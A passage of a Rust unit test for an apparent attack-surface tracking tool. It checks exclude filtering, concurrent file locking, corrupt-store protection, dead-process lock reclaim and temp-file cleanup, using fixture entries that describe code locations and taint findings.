            "ap_frontier_excl_rmw_{}_{}",
            std::process::id(),
            SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .map(|d| d.as_nanos())
                .unwrap_or(0)
        ));
        let _ = fs::remove_dir_all(&td);
        fs::create_dir_all(&td).unwrap();

        let excl_file = td.join("excludes.txt");
        fs::write(&excl_file, "# noise filters\n*vcruntime*\n*.d.ts\n").unwrap();
        let excludes = load_exclude_file(&excl_file).unwrap();
        assert_eq!(excludes.len(), 2);

        let mut st = FrontierState::default();
        let seed_json = json!({
            "items": [
                {"axis": "binary_surface", "module": "bin", "target": "bin/vcruntime140.dll", "symbol": "init"},
                {"axis": "web_api_route", "module": "types", "target": "types/index.d.ts", "symbol": "decl"},
                {"axis": "web_api_route", "module": "api", "target": "src/api/admin.ts", "symbol": "deleteUser"}
            ]
        });
        let (added, skipped, filtered) =
            seed_from_json_str_with_excludes(&mut st, &seed_json.to_string(), &excludes).unwrap();
        assert_eq!((added, skipped, filtered), (1, 0, 2));
        assert_eq!(st.items.len(), 1);
        assert_eq!(st.items[0].target, "src/api/admin.ts");

        let variants_json = json!({
            "target_sinks": ["exec"],
            "siblings": [
                {"file": "vendor/vcruntime_helper.c", "function": "f1", "sink": "exec", "sink_line": 10, "arg_taint": "PARAM_TAINTED", "guard_placement": "UNGUARDED", "is_outlier": true},
                {"file": "src/worker/run.ts", "function": "runJob", "sink": "exec", "sink_line": 22, "arg_taint": "PARAM_TAINTED", "guard_placement": "UNGUARDED", "is_outlier": true}
            ]
        });
        let (kind, i_added, i_skip, i_filt) = ingest_tool_json_str_with_excludes(
            &mut st,
            &variants_json.to_string(),
            Some("variants"),
            &excludes,
        )
        .unwrap();
        assert_eq!(kind, "variants");
        assert_eq!((i_added, i_skip, i_filt), (1, 0, 1));
        assert_eq!(st.items.len(), 2);

        // Multi-thread concurrent locked RMW via run_frontier_seed must preserve every thread's entry
        let fp = td.join("frontier_rmw.json");
        let fp_s = fp.to_string_lossy().to_string();
        let bar = std::sync::Arc::new(std::sync::Barrier::new(6));
        std::thread::scope(|s| {
            for wid in 0..6usize {
                let td_ref = &td;
                let fp_ref = &fp_s;
                let bar_c = std::sync::Arc::clone(&bar);
                s.spawn(move || {
                    bar_c.wait();
                    for round in 0..5usize {
                        let tgt = format!("src/mod_{wid}/ep_{round}.ts");
                        let rc = run_frontier_seed(
                            td_ref,
                            &FrontierSeedOpts {
                                store: Some(fp_ref.as_str()),
                                from_json: None,
                                from_stdin: false,
                                axis: Some("web_api_route"),
                                target: Some(&tgt),
                                module: Some("api"),
                                note: Some("concurrent seed"),
                                score: 85,
                                excludes: &[],
                                as_json: true,
                            },
                        );
                        assert_eq!(rc, 0);
                    }
                });
            }
        });
        let final_st = load_frontier(&fp);
        assert_eq!(
            final_st.items.len(),
            30,
            "full RMW locking must preserve all 6x5 concurrent seeds without lost updates"
        );

        // Regex (`re:`) exclude support + invalid regex rejection
        let re_excludes = vec!["re:^noise/.*\\.tmp$".to_string()];
        let mut st_re = FrontierState::default();
        let re_json = json!({
            "items": [
                {"axis": "fs_path_io", "module": "noise", "target": "noise/cache.tmp", "symbol": "open"},
                {"axis": "fs_path_io", "module": "src", "target": "src/store.rs", "symbol": "open"}
            ]
        });
        let (ra, rs, rf) =
            seed_from_json_str_with_excludes(&mut st_re, &re_json.to_string(), &re_excludes)
                .unwrap();
        assert_eq!((ra, rs, rf), (1, 0, 1));
        assert!(validate_excludes(&["re:[unclosed".to_string()]).is_err());

        // Fail-closed strict loader on corrupt frontier.json (must NEVER wipe corrupt file!)
        let corrupt_fp = td.join("corrupt_frontier.json");
        fs::write(&corrupt_fp, "{ invalid json !!!").unwrap();
        assert!(load_frontier_strict(&corrupt_fp).is_err());
        let rc_corrupt = run_frontier_seed(
            &td,
            &FrontierSeedOpts {
                store: Some(corrupt_fp.to_str().unwrap()),
                from_json: None,
                from_stdin: false,
                axis: Some("exec_spawn"),
                target: Some("src/new.rs"),
                module: None,
                note: None,
                score: 80,
                excludes: &[],
                as_json: true,
            },
        );
        assert_ne!(rc_corrupt, 0);
        assert_eq!(
            fs::read_to_string(&corrupt_fp).unwrap(),
            "{ invalid json !!!",
            "corrupt frontier store must never be silently overwritten"
        );

        // Lock-owner token prevents a stale holder's Drop from deleting a newer holder's lock
        let tok_target = td.join("tok_test.json");
        let lock_file = td.join("tok_test.json.lock");
        {
            let _g1 = acquire_file_lock(&tok_target).unwrap();
            assert!(lock_file.is_file());
            // Simulate another process replacing the lockfile with a different token
            fs::write(&lock_file, "pid=999999 seq=999 ns=1\n").unwrap();
        }
        assert!(
            lock_file.is_file(),
            "Drop must NOT delete a lockfile whose owner token changed"
        );

        // Dead-PID stale lock fast reclaim (must recover in <3s, never wait 10s timeout!)
        let dead_child = if cfg!(windows) {
            std::process::Command::new("cmd")
                .args(["/C", "exit", "0"])
                .spawn()
        } else {
            std::process::Command::new("sh")
                .args(["-c", "exit 0"])
                .spawn()
        };
        if let Ok(mut ch) = dead_child {
            let dead_pid = ch.id();
            let _ = ch.wait();
            let dead_target = td.join("dead_pid_test.json");
            let dead_lock = td.join("dead_pid_test.json.lock");
            fs::write(&dead_lock, format!("pid={dead_pid} seq=1 ns=1\n")).unwrap();
            let t0 = Instant::now();
            let _g_reclaimed = acquire_file_lock(&dead_target).expect("must reclaim dead-PID lock");
            assert!(
                t0.elapsed() < Duration::from_secs(4),
                "dead-PID lock reclaim took too long: {:?}",
                t0.elapsed()
            );
        }

        // Cycle 6: RAII temp guard on failed write & stale dead-PID `.tmp` cleanup on save
        let tmp_dir_test = td.join("tmp_hygiene");
        fs::create_dir_all(&tmp_dir_test).unwrap();
        let store_p = tmp_dir_test.join("frontier.json");
        let dead_child2 = if cfg!(windows) {
            std::process::Command::new("cmd")
                .args(["/C", "exit", "0"])
                .spawn()
        } else {
            std::process::Command::new("sh")
                .args(["-c", "exit 0"])
                .spawn()
        };
        if let Ok(mut ch) = dead_child2 {
            let dead_pid = ch.id();
            let _ = ch.wait();
            let stale_tmp = tmp_dir_test.join(format!("frontier.json.{dead_pid}.12345.0.tmp"));
            let live_tmp =
                tmp_dir_test.join(format!("frontier.json.{}.99999.0.tmp", std::process::id()));
            fs::write(&stale_tmp, "orphaned partial write").unwrap();
            fs::write(&live_tmp, "active peer write").unwrap();
            let mut st_tmp = FrontierState::default();
            save_frontier(&store_p, &mut st_tmp).unwrap();
            assert!(
                !stale_tmp.exists(),
                "dead-PID stale frontier .tmp must be pruned on save"
            );
            assert!(
                live_tmp.exists(),
                "fresh live-PID .tmp must not be prematurely pruned"
            );
            let _ = fs::remove_file(&live_tmp);
        }
        // Replacing onto a directory path fails; RAII TempFileGuard must leave 0 `.tmp` behind
        let dir_as_dst = tmp_dir_test.join("cannot_overwrite_dir");
        fs::create_dir_all(&dir_as_dst).unwrap();
        assert!(atomic_write_text(&dir_as_dst, "{}").is_err());
        let leftover_tmps: Vec<_> = fs::read_dir(&tmp_dir_test)
            .unwrap()
            .flatten()
            .filter(|e| {
                e.file_name()
                    .to_string_lossy()
                    .starts_with("cannot_overwrite_dir.")
                    && e.file_name().to_string_lossy().ends_with(".tmp")
            })
            .collect();
        assert!(
            leftover_tmps.is_empty(),
            "RAII guard must remove temp file on failed atomic write: {leftover_tmps:?}"
        );

        let _ = fs::remove_dir_all(&td);
    }
}
